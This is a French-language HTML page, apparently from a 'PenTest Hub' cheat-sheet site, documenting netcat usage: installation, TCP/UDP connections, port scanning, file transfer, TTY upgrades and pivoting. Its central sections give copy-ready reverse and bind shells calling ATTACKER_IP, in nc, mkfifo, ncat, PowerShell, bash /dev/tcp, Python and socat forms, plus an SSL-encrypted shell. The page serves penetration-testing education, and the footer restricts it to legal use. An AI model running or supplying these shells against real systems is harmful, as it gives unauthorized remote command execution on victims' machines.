@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Netcat — PenTest Hub</title>
+  <link rel="stylesheet" href="../css/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="navbar-brand"><a href="../index.html" style="color:inherit;"><span class="bracket">[</span>PenTest Hub<span class="bracket">]</span></a></div>
+  <div class="navbar-nav">
+    <a href="../index.html">Dashboard</a>
+    <a href="nmap.html">Nmap</a>
+    <a href="wireshark.html">Wireshark</a>
+    <a href="sqlmap.html">SQLMap</a>
+    <a href="john.html">John</a>
+    <a href="google-dorks.html">Dorks</a>
+    <a href="osint.html">OSINT</a>
+    <a href="netcat.html" class="active">Netcat</a>
+  </div>
+</nav>
+
+<div class="tool-page">
+  <a href="../index.html" class="back-btn">← Retour au Hub</a>
+
+  <div class="tool-page-header">
+    <div class="tool-page-icon">🔗</div>
+    <div>
+      <div class="tool-page-title">Netcat (nc)</div>
+      <div class="tool-page-subtitle">Le couteau suisse du réseau — TCP/UDP, reverse shells, transferts, scan</div>
+      <div class="tool-page-meta">
+        <span class="badge badge-orange">Réseau</span>
+        <span class="badge badge-red">Shells</span>
+        <span class="badge badge-blue">TCP/UDP</span>
+      </div>
+    </div>
+  </div>
+
+  <h2 class="section-h">📦 Versions et installation</h2>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Installation</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Debian/Ubuntu/Kali — netcat-openbsd (recommandé)</span>
+sudo apt install netcat-openbsd
+
+<span class="cmd-comment"># Version traditionnelle (avec -e)</span>
+sudo apt install netcat-traditional
+
+<span class="cmd-comment"># ncat (Nmap) — version moderne, SSL, proxy</span>
+sudo apt install ncat
+
+<span class="cmd-comment"># Vérifier la version</span>
+nc --version
+ncat --version</code></pre>
+  </div>
+
+  <div class="info-box info">
+    <span class="info-box-icon">ℹ️</span>
+    <div class="info-box-text"><strong>Note :</strong> La version OpenBSD de nc (par défaut sur Kali) ne supporte pas <code>-e</code>. Utilisez <code>ncat</code> ou les techniques alternatives pour les reverse shells.</div>
+  </div>
+
+  <h2 class="section-h">📋 Cheatsheet complet</h2>
+
+  <h3 class="sub-h">Connexions de base</h3>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Connexions TCP/UDP</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Connexion TCP à un hôte</span>
+nc <span class="cmd-value">192.168.1.1</span> <span class="cmd-value">80</span>
+
+<span class="cmd-comment"># Connexion UDP</span>
+nc <span class="cmd-flag">-u</span> <span class="cmd-value">192.168.1.1</span> <span class="cmd-value">53</span>
+
+<span class="cmd-comment"># Écouter sur un port (listener)</span>
+nc <span class="cmd-flag">-lvnp</span> <span class="cmd-value">4444</span>
+<span class="cmd-comment"># -l listen  -v verbose  -n no DNS  -p port</span>
+
+<span class="cmd-comment"># Écouter et rester actif après déconnexion (ncat)</span>
+ncat <span class="cmd-flag">-lvnp</span> <span class="cmd-value">4444</span> <span class="cmd-flag">--keep-open</span>
+
+<span class="cmd-comment"># Tester si un port est ouvert</span>
+nc <span class="cmd-flag">-zv</span> <span class="cmd-value">192.168.1.1</span> <span class="cmd-value">22</span>
+nc <span class="cmd-flag">-zv</span> <span class="cmd-value">192.168.1.1</span> <span class="cmd-value">20-100</span>
+
+<span class="cmd-comment"># Scan de ports rapide</span>
+nc <span class="cmd-flag">-zv -w 1</span> <span class="cmd-value">192.168.1.1</span> <span class="cmd-value">1-1024</span> 2>&1 | grep "open"
+
+<span class="cmd-comment"># Banner grabbing (identification de service)</span>
+echo "" | nc <span class="cmd-flag">-w 2</span> <span class="cmd-value">192.168.1.1</span> <span class="cmd-value">22</span>
+echo "HEAD / HTTP/1.0" | nc <span class="cmd-value">192.168.1.1</span> <span class="cmd-value">80</span></code></pre>
+  </div>
+
+  <h3 class="sub-h">Reverse Shells</h3>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Reverse Shells avec nc</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># ============================================</span>
+<span class="cmd-comment"># LISTENER (machine attaquante) — TOUJOURS D'ABORD</span>
+nc <span class="cmd-flag">-lvnp</span> <span class="cmd-value">4444</span>
+<span class="cmd-comment"># ============================================</span>
+
+<span class="cmd-comment"># Reverse shell nc avec -e (version traditionnelle)</span>
+nc <span class="cmd-value">ATTACKER_IP</span> <span class="cmd-value">4444</span> <span class="cmd-flag">-e /bin/bash</span>
+nc <span class="cmd-value">ATTACKER_IP</span> <span class="cmd-value">4444</span> <span class="cmd-flag">-e /bin/sh</span>
+
+<span class="cmd-comment"># Reverse shell nc sans -e (OpenBSD)</span>
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <span class="cmd-value">ATTACKER_IP</span> <span class="cmd-value">4444</span> > /tmp/f
+
+<span class="cmd-comment"># ncat (supporte -e)</span>
+ncat <span class="cmd-value">ATTACKER_IP</span> <span class="cmd-value">4444</span> <span class="cmd-flag">-e /bin/bash</span>
+
+<span class="cmd-comment"># Reverse shell Windows (PowerShell)</span>
+powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<span class="cmd-value">ATTACKER_IP</span>',<span class="cmd-value">4444</span>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length)}"
+
+<span class="cmd-comment"># Bash</span>
+bash -i >& /dev/tcp/<span class="cmd-value">ATTACKER_IP</span>/<span class="cmd-value">4444</span> 0>&1
+
+<span class="cmd-comment"># Python 3</span>
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<span class="cmd-value">ATTACKER_IP</span>",<span class="cmd-value">4444</span>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code></pre>
+  </div>
+
+  <h3 class="sub-h">Bind Shells</h3>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Bind Shells</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Sur la machine cible — écoute et offre un shell</span>
+nc <span class="cmd-flag">-lvnp</span> <span class="cmd-value">4444</span> <span class="cmd-flag">-e /bin/bash</span>
+
+<span class="cmd-comment"># Sans -e (OpenBSD)</span>
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <span class="cmd-flag">-lvnp</span> <span class="cmd-value">4444</span> > /tmp/f
+
+<span class="cmd-comment"># Connexion depuis l'attaquant</span>
+nc <span class="cmd-value">TARGET_IP</span> <span class="cmd-value">4444</span></code></pre>
+  </div>
+
+  <h3 class="sub-h">Transfert de fichiers</h3>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">File Transfer</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Envoyer un fichier (depuis l'émetteur)</span>
+<span class="cmd-comment"># 1. Récepteur écoute</span>
+nc <span class="cmd-flag">-lvnp</span> <span class="cmd-value">4444</span> > <span class="cmd-value">fichier_reçu.txt</span>
+
+<span class="cmd-comment"># 2. Émetteur envoie</span>
+nc <span class="cmd-value">RECEIVER_IP</span> <span class="cmd-value">4444</span> < <span class="cmd-value">fichier_local.txt</span>
+
+<span class="cmd-comment"># Transfert de répertoire compressé</span>
+<span class="cmd-comment"># Récepteur :</span>
+nc <span class="cmd-flag">-lvnp</span> <span class="cmd-value">4444</span> | tar xzvf -
+
+<span class="cmd-comment"># Émetteur :</span>
+tar czvf - <span class="cmd-value">/dossier/</span> | nc <span class="cmd-value">RECEIVER_IP</span> <span class="cmd-value">4444</span>
+
+<span class="cmd-comment"># Transfert avec indicateur de progression (pv)</span>
+nc <span class="cmd-flag">-lvnp</span> <span class="cmd-value">4444</span> | pv > <span class="cmd-value">output.bin</span>
+cat <span class="cmd-value">input.bin</span> | pv | nc <span class="cmd-value">IP</span> <span class="cmd-value">4444</span></code></pre>
+  </div>
+
+  <h3 class="sub-h">Upgrade de shell TTY</h3>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">TTY Upgrade — Shell complet</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Méthode 1 — Python pty (la plus courante)</span>
+python3 -c <span class="cmd-string">'import pty; pty.spawn("/bin/bash")'</span>
+
+<span class="cmd-comment"># Méthode 2 — script</span>
+script /dev/null -c bash
+
+<span class="cmd-comment"># Méthode 3 — socat</span>
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<span class="cmd-value">ATTACKER_IP</span>:<span class="cmd-value">4444</span>
+
+<span class="cmd-comment"># Après Python pty — obtenir un vrai TTY interactif :</span>
+<span class="cmd-comment"># 1. Ctrl+Z (mettre nc en arrière-plan)</span>
+stty raw -echo; fg
+<span class="cmd-comment"># 2. Appuyer sur Entrée deux fois</span>
+<span class="cmd-comment"># 3. Configurer le terminal</span>
+export TERM=xterm
+stty rows 50 columns 200
+
+<span class="cmd-comment"># Vérifier les dimensions du terminal</span>
+stty -a | head -1</code></pre>
+  </div>
+
+  <h3 class="sub-h">Tunneling et pivoting</h3>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Tunneling avec nc</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Port forwarding simple (avec ncat)</span>
+ncat <span class="cmd-flag">-lvnp</span> <span class="cmd-value">8080</span> <span class="cmd-flag">--sh-exec</span> <span class="cmd-string">"ncat 192.168.1.1 80"</span>
+
+<span class="cmd-comment"># Proxy basique (avec mkfifo)</span>
+mkfifo /tmp/pipe
+nc <span class="cmd-flag">-lvnp</span> <span class="cmd-value">8080</span> < /tmp/pipe | nc <span class="cmd-value">192.168.1.1</span> <span class="cmd-value">80</span> > /tmp/pipe
+
+<span class="cmd-comment"># ncat SSL (chiffrement de la connexion)</span>
+ncat <span class="cmd-flag">--ssl -lvnp</span> <span class="cmd-value">4444</span>
+ncat <span class="cmd-flag">--ssl</span> <span class="cmd-value">ATTACKER_IP</span> <span class="cmd-value">4444</span> <span class="cmd-flag">-e /bin/bash</span>
+
+<span class="cmd-comment"># Chat entre deux machines</span>
+<span class="cmd-comment"># Machine 1 :</span>
+nc <span class="cmd-flag">-lvnp</span> <span class="cmd-value">4444</span>
+<span class="cmd-comment"># Machine 2 :</span>
+nc <span class="cmd-value">IP_MACHINE1</span> <span class="cmd-value">4444</span></code></pre>
+  </div>
+
+</div>
+
+<footer class="footer"><span>[PenTest Hub]</span> — Usage légal uniquement | © Steveny</footer>
+<div id="toast" class="toast"></div>
+<script src="../js/main.js"></script>
+</body>
+</html>
